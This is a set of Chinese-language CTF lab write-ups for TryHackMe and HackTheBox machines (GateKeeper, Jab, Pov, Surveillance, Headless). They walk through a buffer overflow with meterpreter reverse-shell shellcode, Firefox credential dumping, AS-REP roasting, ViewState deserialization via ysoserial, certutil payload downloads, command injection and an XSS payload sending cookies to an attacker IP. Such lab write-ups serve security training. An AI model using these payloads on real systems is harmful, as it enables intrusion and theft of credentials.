# [THM]GateKeeper #缓冲区溢出漏洞
## Enumeration
扫描端口：
![[Pasted image 20240310135657.png]]
![[Pasted image 20240310135640.png]]
开放了11个端口
开放了smb服务，rdp服务
以及31337上非常SUS的服务，扫描传输的数据会回复HELLO+数据
先枚举其smb分享
![[Pasted image 20240310205721.png]]
可以看到有Users分享，尝试匿名登录：
![[Pasted image 20240310205840.png]]
可以看到Share文件夹下的gatekeeper.exe文件
get下载下来(使用binary二进制模式下载，不然运行会出问题)
## Analysis
放到windows系统下运行：
![[Pasted image 20240310210224.png]]
显示等待连接，上面扫描到的31337可能就是运行了此程序
尝试使用netcat连接此端口：
![[Pasted image 20240310210545.png]]
可以看到他就是上面所扫描到的服务，且会显示其收到的数据大小
将其丢入Immunity Debugger(官网下载)，并安装mona插件(可以在github上下载)
使用脚本测试缓冲区溢出所需的字节大小
![[Pasted image 20240310211632.png]]
其在150字节时崩溃，重启程序后
使用msf生成150字节的模式字节作为payload向其发送(使用：`msf-pattern_create -l 长度`)
![[Pasted image 20240310212621.png]]
完美崩溃，在Immunity Debugger的控制台内输入`!mona findmsp -distance 150`
来查找这个重复的150字节模式
![[Pasted image 20240310213009.png]]
可以看到EIP的offset是146
接下来测试146的offset是否可以完美的覆盖掉EIP寄存器
![[Pasted image 20240310213600.png]]
发送146bytes的数据，再加4bytes的“CCCC”后缀
完美崩溃，查看寄存器EIP
![[Pasted image 20240310213721.png]]
可以看到四个“43”即"C"说明146bytes的offset是正确的
接下来测试坏字符(BADCHAR),如“\\x00”这种字符在shell代码中是无法使用的，会导致shell无法成功的执行
先设置mona插件的工作目录(接下来会用到)
`!mona config -set workingfolder c:\mona\%p`
使用mona插件生成除去"\\x00"的字节对照表：
![[Pasted image 20240310214720.png]]
同时将这个对照表复制到脚本中作为payload进行发送测试：
![[Pasted image 20240310214958.png]]
发送后崩溃，复制ESP地址：![[Pasted image 20240310215044.png]]
并在控制台中执行：
`!mona compare -f C:\mona\gatekeeper\bytearray.bin -a 008B19E8`
来与之前生成的对照表进行比较：
![[Pasted image 20240310215240.png]]
结果是00 0a，00我们上面已经添加过了，现在把0a从对照表及脚本的对照表Payload中剔除掉(重要)
![[Pasted image 20240310215501.png]]
![[Pasted image 20240310215440.png]]
重启程序，再次执行脚本
![[Pasted image 20240310215711.png]]
崩溃，查看ESP地址：![[Pasted image 20240310215749.png]]
![[Pasted image 20240310215843.png]]
当其显示Unmodified时则说明坏字符已经被我们剔除干净
坏字符是：`\x00\x0a`
接下来寻找跳跃点JMP：
使用!mona jmp -r esp -cpb "\x00\x0a"
cpb后跟我们找到的坏字符：
![[Pasted image 20240310225227.png]]
Results后跟的地址就是我们所需的JMP
随便挑选一个，以小端序(和显示的地址反过来)填入脚本的retn部分：
![[Pasted image 20240310225434.png]]
接下来使用msfvenom生成我们所需的shellcode
-b选项剔除了我们不需要的坏字符，这里生成的是meterpretershell
`msfvenom -p windows/meterpreter/reverse_tcp -f c -b "\x00\x0a" LHOST=攻击机IP LPORT=攻击机端口`
![[Pasted image 20240310220236.png]]
![[Pasted image 20240310220310.png]]
## Getshell
发送Payload前准备好meterpreter接收器监听
![[Pasted image 20240310220435.png]]
将上面的shellcode作为脚本的payload进行发送：
![[Pasted image 20240310220635.png]]
成功接收到反弹shell:
![[Pasted image 20240310220716.png]]
![[Pasted image 20240310220811.png]]
拿到user.txt：`{H4lf_W4y_Th3r3}`
可以看到桌面firefox的快捷方式，其上安装了火狐浏览器，看wp秒了，是浏览器保存的凭证可以进行利用，我们可以在此路径找到凭证文件：
`C:\Users\{user}\AppData\Roaming\Mozilla\Firefox\Profiles\`
![[Pasted image 20240310221229.png]]
后台当前session(使用CTRL+Z)：![[Pasted image 20240310221659.png]]
使用`multi/gather/firefox_creds`这个post模块
设置session号为刚才后台的session号
![[Pasted image 20240310222305.png]]
执行后转储了凭证文件到其显示的路径
这些文件的初始名称为cert9.db、cookies.sqlite、key4.db、logins.json
将转储的文件重命名为它们原来的文件名
clone解密脚本：
`https://github.com/unode/firefox_decrypt`
对存放凭证文件的文件夹使用脚本，得到密码:
![[Pasted image 20240310223510.png]]
使用RDP及上面的凭证进行远程登录：
![[Pasted image 20240310223757.png]]
在桌面拿到root.txt
`{Th3_M4y0r_C0ngr4tul4t3s_U}`
## Hint
Immunity Debugger以及mona插件的使用和缓冲区溢出利用
# [HTB] Jab #DCOM #AS-REP
- **初始侦察**：使用**nmap**扫描发现开放端口88、445和5222。
- **SMB尝试**：尝试使用**smbclient**和**crackmapexec**检查共享文件夹，但遇到错误。
- **Jabber/XMPP服务**：发现运行着**Jabber**和**XMPP**聊天服务。
- **Pidgin客户端**：通过**Pidgin**客户端连接到XMPP服务并注册账户。
- **用户搜索**：利用Pidgin的用户搜索功能，通过输入星号(*)进行高级搜索，获取用户列表。
- **AS-REP Roasting**：使用**Impacket**工具中的**GetNPUsers.py**进行AS-REP Roasting获取用户哈希。***\*None PreAuth Users***
- **密码破解**：使用**john**或**hashcat**结合**rockyou.txt**字典文件破解哈希。
- **远程连接**：使用获取的凭证通过**dcomexec.py**工具建立远程连接。***\*DCOM组件利用***
- **漏洞利用**：利用CVE-2023–32315漏洞，通过上传恶意**.jar**文件到Openfire admin console实现远程代码执行（RCE）。
- **端口转发**：使用**Chisel**设置端口转发以访问本地端口9090和9091。***\*Chisel的使用***
- **获取根权限**：通过Openfire admin console的RCE获取系统（root）权限，并查看root.txt文件。
## Hint
NP标志位的设置以及利用，DCOM组件的利用
# [HTB] Pov #\.Net反序列化
```Credential
alaading
f8gQ8fynP44ek1m3
```
## Enumeration and Analysis 枚举和分析

### Nmap
让我们使用以下命令运行一个简单的 Nmap 扫描：
```bash
nmap -sC -sV IP
```

### Directory Enumeration 目录枚举
让我们使用以下命令进行目录枚举：
```bash
dirsearch -u clicker.htb -e*
```
或者
```bash
gobuster dir -u http://pov.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```
我们没有发现任何有趣的东西。

### Subdomain Enumeration 子域枚举
让我们使用以下命令执行 DNS 枚举：
```bash
gobuster dns -d clicker.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 20
```
但是我们在扫描中没有发现任何有趣的东西。

## Initial Foothold 初始立足点

### Port — 80 端口 — 80
在枚举 http://pov.htb 时，我们在页脚中找到了用户名和子域 http://dev.pov.htb 。

让我们将其添加到主机并检查它。此外，在 http://dev.pov.htb 上，还有一个文件下载选项。

Upon intercepting that request, we can see a list of parameters like below:

```plaintext
__EVENTTARGET=download&
__EVENTARGUMENT=&
__VIEWSTATE=DY%2FikU7FyXJZCW0op4Kz6Bgqd4o%2FFtEfEsiowrOTlRKwk96TfCKJt6cwtTy82KRl93H2SNf4FCvmzZuhMaKfKMCbzZg%3D&
__VIEWSTATEGENERATOR=8E0F0FA3&
__EVENTVALIDATION=eGOIJz%2BJA4RbAfYNdIjP%2FXmYDtUaz97UabMUsYu%2Bg8ppRuevK%2FWEufVY9E0M8KqssT57LzrVSlgu%2FzTmjoojoiS270xt9sBSLasZ2CSk2sh4uF3oBk9hMWE%2FILb9D20b1kQDEA%3D%3D
&file=cv.pdf
```

我们可以尝试将文件名从“cv.pdf”更改为另一个敏感文件名。当我们将文件名更改为“/web.config”时，我们会收到以下响应：

```xml
<configuration>
  <system.web>
    <customErrors mode="On" defaultRedirect="default.aspx" />
    <httpRuntime targetFramework="4.5" />
    <machineKey decryption="AES" decryptionKey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" validation="SHA1" validationKey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" />
  </system.web>
    <system.webServer>
        <httpErrors>
            <remove statusCode="403" subStatusCode="-1" />
            <error statusCode="403" prefixLanguageFilePath="" path="http://dev.pov.htb:8080/portfolio" responseMode="Redirect" />
        </httpErrors>
        <httpRedirect enabled="true" destination="http://dev.pov.htb/portfolio" exactDestination="false" childOnly="true" />
    </system.webServer>
</configuration>
```

## User.txt 用户文档

经过研究，我找到了一种利用这个漏洞的方法。

首先，我们需要使用以下命令创建有效负载：

```bash
python3 Reverse_Shell_for_Power_Shell.py IP 4444
```

打开 Windows 虚拟机，从 [链接] 下载ysoserial.exe，使用命令提示符导航到该文件夹，按以下语法粘贴有效负载，然后按 Enter。

```plaintext
ysoserial.exe -p ViewState -g TextFormattingRunProperties --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" --path="/portfolio/default.aspx" -c "Paste_the_payload_here"
```

现在，单击 http://dev.pov.htb 上的“下载简历”按钮，捕获请求，粘贴我们之前为“__VIEWSTATE”参数创建的代码，然后发送请求。

如果您正确完成了所有操作，您将收到一个连接。

我们现在处于“sfitz”的外壳中。我在 sfitz 的 Documents 文件夹中发现了一个有趣的文件，其中包含特权用户“alaading”的密码。

使用以下命令获取该密码：

```plaintext
echo > pass.txt
$EncryptedString = Get-Content .\pass.txt
$SecureString = ConvertTo-SecureString $EncryptedString
$Credential = New-Object System.Management.Automation.PSCredential -ArgumentList "username",$SecureString
echo $Credential.GetNetworkCredential().password
```

下载“RunasCs.exe”，“psgetsys.ps1”和“EnableAllTokenPrivs.ps1”。

打开下载文件夹中的终端，然后键入以下命令以启动HTTP服务器，以将文件从我们的机器传输到Windows：

```bash
python3 -m http.server
```

该文件的链接类似于 http：//YOUR_IP：8000/filename。现在，使用以下命令在受害计算机上下载文件：

```plaintext
certutil.exe -

urlcache -split -f "http://IP:8000/EnableAllTokenPrivs.ps1" ".\EnableAllTokenPrivs.ps1"
certutil.exe -urlcache -split -f "http://IP:8000/psgetsys.ps1" ".\psgetsys.ps1"
certutil.exe -urlcache -split -f "http://IP:8000/RunasCs.exe" ".\RunasCs.exe"
```

现在，在您的计算机上启动侦听器，并在受害计算机上键入以下命令，以使用提供的凭据访问 Alaading 的帐户：

```plaintext
.\RunasCs.exe alaading f8gQ8fynP44ek1m3 cmd.exe -r YOUR_IP:4444
```

使用以下命令查看标志或手动将目录更改为 alaading 的目录：

```plaintext
type C:\Users\alaading\Desktop\user.txt
```

## Privilege Escalation 权限提升

如果我们键入“whoami /priv”，我们可以看到“sedebugPrivilegePoC”权限已被禁用。若要启用此权限的状态，请导航到目录并使用以下命令执行我们在上一节中下载的脚本：

```plaintext
.\psgetsys.ps1
.\EnableAllTokenPrivs.ps1
```

在计算机上，使用以下命令创建 Windows 有效负载：

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=5555 -f exe > exploit.exe
```

将“exploit.exe”移动到我们托管 HTTP 服务器的目录，并使用上述技术将文件发送到受害计算机。在您的机器上配置 Meterpreter，并在受害机器上运行“exploit.exe”。

键入“ps”并找到“winlogon.exe”的 PID。然后键入“migrate PID_VALUE”，然后键入“shell”。现在，您可以以“nt authority\system”的身份访问。

使用以下命令查看标志或手动将目录更改为管理员的目录：

```plaintext
type C:\Users\Administrator\Desktop\root.txt
```

我们已获得管理员标志。
## Hint
__ViewState的反序列化及利用，Powershell本地凭证的提取，使用RunasCS利用明文密码进行runas操作，使用脚本启用所有拥有的权限
# [HTB] Surveillance
## Lab Info

Lab IP: 10.10.11.245 Lib 应用程序：10.10.11.245

Lab difficulty: medium 实验室难度：中等

Lab OS: Linux 实验室操作系统：Linux

## Enumeration

Starting of with an nmap scan as usual to uncover open ports on target and the services they run.  
像往常一样从 nmap 扫描开始，以发现目标上的开放端口及其运行的服务。

> nmap 10.10.11.245 -sCV — min-rate=1000 -oN nmap.out  
> nmap 10.10.11.245 -sCV — 最小速率 = 1000 -oN nmap.out

Discovered port 80 (http) and port 22 (ssh) [Ignore the other ports serving SimpleHTTPServer, some other players are in the machine transferring files with those ports as we are all on a shared server]. I decided to enumerate port 80 first as it’s the lowest hanging fruit.  
发现端口 80 （http） 和端口 22 （ssh） [忽略其他为 SimpleHTTPServer 提供服务的端口，其他一些玩家正在机器中使用这些端口传输文件，因为我们都在共享服务器上]。我决定首先枚举端口 80，因为它是最容易实现的。

I ‘CURLed’ the header to find the proper hostname, and added it to my hostnames file /etc/hosts.  
我“卷曲”了标头以找到正确的主机名，并将其添加到我的主机名文件 /etc/hosts 中。

![](https://miro.medium.com/v2/resize:fit:700/1*KeAE8HeVssjH19VFiUvtgQ.png)

I decided to run a directory bruteforce on port 80 with ffuf while I go check browser for what functions/suprise port 80 might have for us.  
我决定在端口 80 上使用 ffuf 运行目录暴力破解，同时检查浏览器以了解端口 80 可能为我们提供的功能/支持。

![](https://miro.medium.com/v2/resize:fit:700/1*-5IE7DnnFBMaKStQ5mj6og.png)

I came across this web page with little to no responsiveness, I checked the extension ‘wappalyzer’ (wappalyzer helps understand the technology a certain website is making use of), I noticed the website is making use of CraftCMS amidst numerous other, caught my attention. So, I scrolled down to where there was footer **‘Powered by CraftCMS’,** hovering my mouse on the footer exposes what seem to be the version of the CMS at the extreme left hand corner. I made sense of craftcms 4.4.14  
我遇到了这个网页，几乎没有响应，我检查了扩展程序“wappalyzer”（wappalyzer有助于理解某个网站正在使用的技术），我注意到该网站正在使用CraftCMS在许多其他网站中，引起了我的注意。因此，我向下滚动到页脚“Powered by CraftCMS”的位置，将鼠标悬停在页脚上，在最左上角露出似乎是CMS版本的内容。我理解了 craftcms 4.4.14

![](https://miro.medium.com/v2/resize:fit:700/1*Vqoute0L2FBCw1aypZaqZQ.png)

So I embark on the search for a publicly available exploit POC that might exist for that particular CMS version. I found a POC by a researcher named ‘Faelian’ on his github and realized the vulnerability was assigned a CVE name of [CVE-2023–41892](https://github.com/Faelian/CraftCMS_CVE-2023-41892).  
因此，我开始寻找该特定 CMS 版本可能存在的公开可用的漏洞利用 POC。我在他的 github 上发现了一个名为“Faelian”的研究人员的 POC，并意识到该漏洞被分配了 CVE 名称 CVE-2023–41892 。

## Gaining Shell

I cloned repository and and ran the POC and got a shell albeit unstable. I solved that by running a command in gotten shell to get another reverse shell on a listener by ‘pwncat’ ([https://github.com/calebstewart/pwncat](https://github.com/calebstewart/pwncat))I have running which will stabilize whatever shell it catches.  
我克隆了存储库并运行了 POC，得到了一个 shell，尽管不稳定。我通过在 get shell 中运行命令通过“pwncat”（ [https://github.com/calebstewart/pwncat](https://github.com/calebstewart/pwncat) ）在侦听器上获取另一个反向 shell 解决了这个问题，我正在运行它将稳定它捕获的任何 shell。

![](https://miro.medium.com/v2/resize:fit:700/1*Bxm8ekcNzG-Cv--1NZ5ZvA.png)

I started enumerating right from the directory I found myself, checking every juicy looking file for example the ‘web.config’ that’s in the current directory I got shell into but it holds nothing of importance to us, I changed directory one level back and found a ‘storage’ directory and within it I found a ‘backup’ which also contains a ‘zip’ file.  
我从我找到的目录开始枚举，检查每个看起来多汁的文件，例如我进入 shell 的当前目录中的“web.config”，但它对我们来说并不重要，我将目录更改了一级并找到了一个“存储”目录，在其中我发现了一个“备份”，其中还包含一个“zip”文件。

![](https://miro.medium.com/v2/resize:fit:700/1*X3s1f0_y1jPCz4Xu0R4AtA.png)

I transferred the zipped file into my local machine to unzip and get a feel of what the zipped file may be hiding.  
我将压缩文件传输到本地计算机以解压缩并了解压缩文件可能隐藏的内容。

![](https://miro.medium.com/v2/resize:fit:700/1*UwoIwXV8IKikanviLRXcIw.png)

After extracting the zipped file, I got an sql file and during analysis, I found a users table with some user matthew and its hash.  
提取压缩文件后，我得到了一个 sql 文件，在分析过程中，我发现了一个用户表，其中包含一些用户 matthew 及其哈希值。

![](https://miro.medium.com/v2/resize:fit:700/1*HNpIKi_tGtbNVbqiFW-gtg.png)

Confirmed hash type on [hashes.com](http://hashes.com/) to be SHA256.  
hashes.com 上确认的哈希类型为 SHA256。

![](https://miro.medium.com/v2/resize:fit:700/1*GYr5HT-X9QqAIy9UH-bXqg.png)

I was able to crack the hash for user ‘matthew’ using JohnTheRipper and ssh into matthew.  
我能够使用 JohnTheRipper 破解用户“matthew”的哈希值，然后 ssh 到 matthew 中。

![](https://miro.medium.com/v2/resize:fit:700/1*8UnnNU32r_tVf7gnq9yv2A.png)

Started enumerating common privileges escalation vectors in linux, checked for misconfigured SUID, misconfigured writable sensitive files, common kernel exploit, groups, common sensitive directories, crontabs, e.t.c until I decided to run Linpeas ([https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)). Downloaded onto my local machine and transferred to target.  
开始在 linux 中枚举通用权限升级向量，检查错误配置的 SUID、错误配置的可写敏感文件、常见内核漏洞、组、常见敏感目录、crontabs 等，直到我决定运行 Linpeas （ [https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) ）。下载到我的本地机器上并传输到目标。

I found an nginx web service named ‘zoneminder’ and I found some mysql credentials that seems to be from the same source as storage/backups with password almost having the same strings as ‘zoneminder’  
我找到了一个名为“zoneminder”的nginx Web服务，我发现了一些mysql凭据，这些凭据似乎与存储/备份来自同一来源，密码几乎与“zoneminder”具有相同的字符串

![](https://miro.medium.com/v2/resize:fit:700/1*gC3Dbx6wPfCZuGMMpOtDug.png)

![](https://miro.medium.com/v2/resize:fit:700/1*FKmKNmnVT7WpcoqINoS9VA.png)

Curiosity set in and I decided to research zoneminder, only to found that it is an API that can provide a complete surveillance system circuit.  
好奇心驱使我，决定研究 zoneminder，结果发现它是一个可以提供完整监控系统电路的 API。

I found it running locally and for me to be able to visit it on my machine browser, i had to port forward.  
我发现它在本地运行，为了让我能够在我的机器浏览器上访问它，我必须端口转发。

![](https://miro.medium.com/v2/resize:fit:700/1*QfET2opJRCHMYw8u0yFecg.png)

I found a login page, tried default ‘admin:admin’ combination, did not work, tried basic sqli, none worked still.  
我找到了一个登录页面，尝试了默认的“admin：admin”组合，但不起作用，尝试了基本的 sqli，但仍然无法正常工作。

![](https://miro.medium.com/v2/resize:fit:700/1*AtHA8JPcM1dhN8HgLfA7_A.png)

I decided to search online for publicly available exploit POC for zoneminder and found one by rvizx on his github, ran it gaainst target and got shell as ‘zoneminder’  
我决定在网上搜索 zoneminder 的公开漏洞利用 POC，并在他的 github 上找到了 rvizx 的一个，运行了它的 gaainst 目标并得到 shell 作为“zoneminder”

![](https://miro.medium.com/v2/resize:fit:700/1*6j99dl9Xsihdvgmoe3OaqA.png)

I started enumerating common privileges escalation vectors in linux, checked for misconfigured SUID, misconfigured writable sensitive files, common kernel exploit, groups, common sensitive directories, crontabs, until i tried the command ‘sudo -l’ to check what superuser privilege user zoneminder has and realized he has sudo access to a not so clear perl script.  
我开始枚举 linux 中的常见权限提升向量，检查是否配置错误的 SUID、错误配置的可写敏感文件、常见内核漏洞、组、常见敏感目录、crontabs，直到我尝试命令“sudo -l”检查用户 zoneminder 拥有的超级用户权限，并意识到他可以 sudo 访问一个不太清楚的 perl 脚本。

![](https://miro.medium.com/v2/resize:fit:700/1*5zL3qCA4Wti5R2Wt4wJnJg.png)

As the the weird script is in /usr/bin and is a script starting zm and having a wildcard, I started looking for evry file with that descirption using find command and reading the perl scripts to understand what they can do until I came across zmupdate.pl.  
由于奇怪的脚本位于 /usr/bin 中，并且是一个以 zm 开头并具有通配符的脚本，因此我开始使用 find 命令查找具有该解析的 evry 文件并阅读 perl 脚本以了解它们可以做什么，直到我遇到 zmupdate.pl。

![](https://miro.medium.com/v2/resize:fit:700/0*IsJqGePvcXmpZImf)

I found in it at the top of the code a command help guide.  
我在代码顶部找到了命令帮助指南。

![](https://miro.medium.com/v2/resize:fit:700/0*SRH0QvyScynJBDUR)

I queried the version while providing a random version and the user ‘root’ alone and behold output gave a mysql command that contained a password in it’s query  
我在提供随机版本时查询了版本，用户“root”单独输出了一个 mysql 命令，该命令在其查询中包含密码

![](https://miro.medium.com/v2/resize:fit:700/0*gx70RqRtXiNDlDGL)

— SNIP — — 剪 —

![](https://miro.medium.com/v2/resize:fit:700/0*6tlAfWRaTX9d_Pge)

After spending much time without good results, out of complete curiosity, I decided to chain a command into the user value with the user being empty while using the semicolon to chain. And lo and behold, I got root!  
在花了很多时间没有得到好的结果之后，出于完全的好奇心，我决定将命令链接到用户值中，用户为空，同时使用分号进行链接。瞧，我扎根了！

![](https://miro.medium.com/v2/resize:fit:700/0*ojiPtEikNMlAP8Vn)

But the shell wasn’t stable, I had to exit root for commands I ran to execute.  
但是 shell 不稳定，我必须退出 root 才能执行我运行的命令。

![](https://miro.medium.com/v2/resize:fit:700/0*1o56wb0NuGwUo39N)

So I decided to use busybox to make use of netcat to give me a reverse shell from root.  
所以我决定使用 busybox 来利用 netcat 给我一个来自 root 的反向 shell。

![](https://miro.medium.com/v2/resize:fit:700/0*_g362aYEoB52iYy4)
## Hint
枚举后要注意可疑的凭证，备份文件。以及使用各种方式稳定shell,和命令行的参数命令注入利用
# [HTB] headless #XSS 
## Enumeration
Nmap

As always I started with a quick all ports Nmap scan.  
与往常一样，我从快速的所有端口 Nmap 扫描开始。

![](https://cybersec-2.gitbook.io/~gitbook/image?url=https:%2F%2F1798236562-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FeknkpLoG0ZPnMNxHet6A%252Fuploads%252F13BRJVZ6y5a63HTUHauS%252Fimage.png%3Falt=media%26token=b718ce3b-f85b-43d2-8bf2-4226339b2825&width=768&dpr=4&quality=100&sign=d3d1f6ef15a85f1c28a1d042decbd9666d713562690bde67e4fa4a450336d46e)

With the open ports known I did a service and version check on those ports.  
在已知开放端口的情况下，我对这些端口进行了服务和版本检查。

![](https://cybersec-2.gitbook.io/~gitbook/image?url=https:%2F%2F1798236562-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FeknkpLoG0ZPnMNxHet6A%252Fuploads%252FZYjgGjI4Hm5871olGAGz%252Fimage.png%3Falt=media%26token=9fa72530-4ee0-4075-b3b4-53ab31029a5d&width=768&dpr=4&quality=100&sign=99fa450b8b22e3276a2d03dfcbddf5c376741225ef569f97c04f2437add5d94d)

On port **5000** there is a Flask web server.  
在端口 5000 上有一个 Flask Web 服务器。

With the web server known I ran FeroxBuster to see if there was anything of value.  
在已知 Web 服务器的情况下，我运行了 FeroxBuster 以查看是否有任何有价值的东西。

![](https://cybersec-2.gitbook.io/~gitbook/image?url=https:%2F%2F1798236562-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FeknkpLoG0ZPnMNxHet6A%252Fuploads%252FK75qhyr8a993FYanVyJE%252Fimage.png%3Falt=media%26token=abb71993-2af1-4418-b4d3-7c2430d8c848&width=768&dpr=4&quality=100&sign=337ada24c8611535f4620af6447e42f75fadd9bcea16795a867dd605b3377031)

The Dashboard item looks interesting, though a 500 error indicated an Internal Server Error.  
仪表板项看起来很有趣，尽管 500 错误表示内部服务器错误。

Web Enumeration

There is a website running on the python server that shows a splash page with a count down with a link to another page **/support**.  
python 服务器上运行着一个网站，它显示了一个带有倒计时的启动页面，其中包含指向另一个页面 /support 的链接。

![](https://cybersec-2.gitbook.io/~gitbook/image?url=https:%2F%2F1798236562-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FeknkpLoG0ZPnMNxHet6A%252Fuploads%252FA2PwARTmkaglY1eRe5bS%252Fimage.png%3Falt=media%26token=05d66c02-2c6e-49d4-aace-51c9181c03cc&width=768&dpr=4&quality=100&sign=d9f0206803c7e2f7aca85946089f4c5a8d760b3fd1356638356222fc28fdaaab)

Trying out the **/dashboard** directory found using FeroxBuster returns an "Unauthorised" page.  
尝试使用 FeroxBuster 找到的 /dashboard 目录会返回一个“未经授权”的页面。

![](https://cybersec-2.gitbook.io/~gitbook/image?url=https:%2F%2F1798236562-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FeknkpLoG0ZPnMNxHet6A%252Fuploads%252FQcRKXZoW2Zumr70pGgzs%252Fimage.png%3Falt=media%26token=f86bf272-adab-4105-a8fe-1171ffdceabe&width=768&dpr=4&quality=100&sign=4a2ae59b6cf14f17690ac0f6aa2350fa7c6022fc7c0bb211ba82148553e44c1b)

On the **/support** page there is a contact form.  
在 /support 页面上有一个联系表单。

![](https://cybersec-2.gitbook.io/~gitbook/image?url=https:%2F%2F1798236562-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FeknkpLoG0ZPnMNxHet6A%252Fuploads%252FViMrJd59NApi7RLfa4VK%252Fimage.png%3Falt=media%26token=0a7263cb-d756-4a5d-a189-087b73c56e7c&width=768&dpr=4&quality=100&sign=aa8102229d7a858a440fbc6b883fca34233869070f4b3b28f914289d0d7f5404)

Within the HTTP request body there is a cookie being set to determine if someone is an admin.  
在 HTTP 请求正文中，设置了一个 cookie 来确定某人是否是管理员。

![](https://cybersec-2.gitbook.io/~gitbook/image?url=https:%2F%2F1798236562-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FeknkpLoG0ZPnMNxHet6A%252Fuploads%252FCw0QFbzDMoPfi2w19YUo%252Fimage.png%3Falt=media%26token=9ec3a20c-a15f-4793-a402-77390f7ccbce&width=768&dpr=4&quality=100&sign=e0032ba25bf04218676a4780436046fa4b3563373b805a2d38fddc04a3ddd1a8)

XSS

Using XSS it is possible to capture an admin cookie, this can then be injected to the HTTP requests to act as an admin for the web app. The concept here is to force the web server to request a resource from our web server and request a cookie from the requester. Using this method it's possible to steal an admin cookie.  
使用 XSS 可以捕获管理 cookie，然后可以将其注入 HTTP 请求以充当 Web 应用程序的管理员。这里的概念是强制 Web 服务器从我们的 Web 服务器请求资源，并向请求者请求 cookie。使用此方法可以窃取管理cookie。

Copy

```
<script>document.location='http://10.10.14.149?='+document.cookie;</script>
```

![](https://cybersec-2.gitbook.io/~gitbook/image?url=https:%2F%2F1798236562-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FeknkpLoG0ZPnMNxHet6A%252Fuploads%252FHlr070e8JWuQc9OVGaQH%252FInjection.PNG%3Falt=media%26token=4ce334be-f006-44d3-a6d3-b278ee1c2b1a&width=768&dpr=4&quality=100&sign=983f964bd7b5fe913f05ba88173940cb8c5ad882232387b5326c10c4ffb2a042)

Using this payload triggers an error from the server.  
使用此有效负载会触发来自服务器的错误。

The < and > characters are blacklisted, this is what triggers the error  
<和>字符被列入黑名单，这就是触发错误的原因

![](https://cybersec-2.gitbook.io/~gitbook/image?url=https:%2F%2F1798236562-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FeknkpLoG0ZPnMNxHet6A%252Fuploads%252F89VAl2EpYkI1lfHteTMC%252FRe_send_injection.PNG%3Falt=media%26token=3028eef1-704f-46cf-ad52-410ccbffdf73&width=768&dpr=4&quality=100&sign=643e080dd17070f21f4235ce2b2fc46f77e46fab13ed0e599a60ea68e6654cb1)

XSS in User Agent Header 用户代理标头中的 XSS

In this error response page we can see the **user agent** is being presented back, this marks the injection point. Where the user agent is being rendered client side it may then be possible to inject something to the user agent, and have that render upon reloading.  
在此错误响应页面中，我们可以看到用户代理正在显示，这标记了注入点。如果用户代理是客户端渲染的，则可以向用户代理注入某些内容，并在重新加载时进行渲染。

I hit refresh on this page, intercepted and updated the user agent to the below payload:  
我在此页面上点击刷新，拦截并将用户代理更新为以下有效负载：

Copy

```
<script>document.location='http://10.10.14.149?='+document.cookie;</script>
```

Once I resent the request I got a hit back to my web server.  
一旦我重新发送请求，我的网络服务器就会受到打击。

![](https://cybersec-2.gitbook.io/~gitbook/image?url=https:%2F%2F1798236562-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FeknkpLoG0ZPnMNxHet6A%252Fuploads%252FbO4KuRGFr0r8qQz6qHdi%252FXSS_Admin_Cookie.PNG%3Falt=media%26token=88c2a01f-3d8d-4e86-9a8a-2dc4e580b8ab&width=768&dpr=4&quality=100&sign=c90e75395f77bce1237c17b2ec8ce4fa4eb8d75161a8653b1fcb672bed43bc85)

**Defence**: To mitigate this, developers should properly escape all untrusted data based on the context (HTML, JavaScript, URL, etc.) using libraries designed for this purpose. For User-Agent logging or display, applying HTML entity encoding along with ensuring that escaping is used where appropriate.  
防御：为了缓解这种情况，开发人员应使用为此目的设计的库，根据上下文（HTML、JavaScript、URL 等）正确转义所有不受信任的数据。对于 User-Agent 日志记录或显示，应用 HTML 实体编码，同时确保在适当的情况下使用转义。
## Getting Shell
Dashboard

With the admin cookie stolen I could get into the /dashboard part of the app.  
随着管理cookie被盗，我可以进入应用程序的/dashboard部分。

